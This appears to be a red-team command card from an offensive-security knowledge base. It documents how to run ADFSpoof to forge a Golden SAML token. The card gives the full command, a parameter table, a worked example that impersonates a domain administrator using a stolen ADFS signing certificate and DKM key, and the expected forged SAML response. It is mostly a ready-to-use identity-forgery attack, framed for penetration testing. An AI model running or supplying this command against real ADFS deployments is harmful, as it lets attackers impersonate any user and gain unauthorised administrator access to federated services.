---
type: command
executor: bash
data: >-
  python ADFSpoof.py -b EncryptedPfx.bin dkmKey.bin -s $_ADFS_SERVER saml2
  --endpoint $_ADFS_ENDPOINT --nameidformat
  urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid
  '$_DOMAIN\\$_USERNAME' --rpidentifier $_RP_IDENTIFIER --assertions
  '$_ASSERTIONS'
platforms:
  - Linux
  - macOS
tags:
  - saml
  - forgery
  - adfs
verified: true
validated: true
---

# execute-adfsspoof-python-script-for-golden-saml

## Command

```bash
python ADFSpoof.py -b EncryptedPfx.bin dkmKey.bin -s $_ADFS_SERVER saml2 --endpoint $_ADFS_ENDPOINT --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid '$_DOMAIN\\$_USERNAME' --rpidentifier $_RP_IDENTIFIER --assertions '$_ASSERTIONS'
```

## Description

Executes the ADFSpoof Python script to forge a Golden SAML token using provided binary certificate and key files, targeting a specific ADFS endpoint and user impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-b EncryptedPfx.bin` | Path to binary PFX file | Yes |
| `dkmKey.bin` | Path to binary private key file | Yes |
| `$_ADFS_SERVER` | ADFS server hostname (e.g., adfs.pentest.lab) | Yes |
| `--endpoint $_ADFS_ENDPOINT` | Full ADFS SAML endpoint URL | Yes |
| `--nameid '$_DOMAIN\\$_USERNAME'` | User to impersonate (e.g., PENTEST\\administrator) | Yes |
| `--rpidentifier $_RP_IDENTIFIER` | Relying party identifier (e.g., Supervision) | Yes |
| `--assertions '$_ASSERTIONS'` | Custom SAML attribute assertions XML | Yes |

## Examples

### Basic Usage

```bash
python ADFSpoof.py -b EncryptedPfx.bin dkmKey.bin -s adfs.pentest.lab saml2 --endpoint https://www.contoso.com/adfs/ls/SamlResponseServlet --nameidformat urn:oasis:names:tc:SAML:2.0:nameid-format:transient --nameid 'PENTEST\\administrator' --rpidentifier Supervision --assertions '<Attribute Name="http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"><AttributeValue>PENTEST\\administrator</AttributeValue></Attribute>'
```

### Advanced Usage

Add `--outfile forged_token.xml` to save output.

## Expected Output

Forged SAML token output:
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response ... >
...
</samlp:Response>

Base64-encoded version for HTTP POST.

## Related

- [[procedures/Golden-SAML-Attack-via-ADFS]]
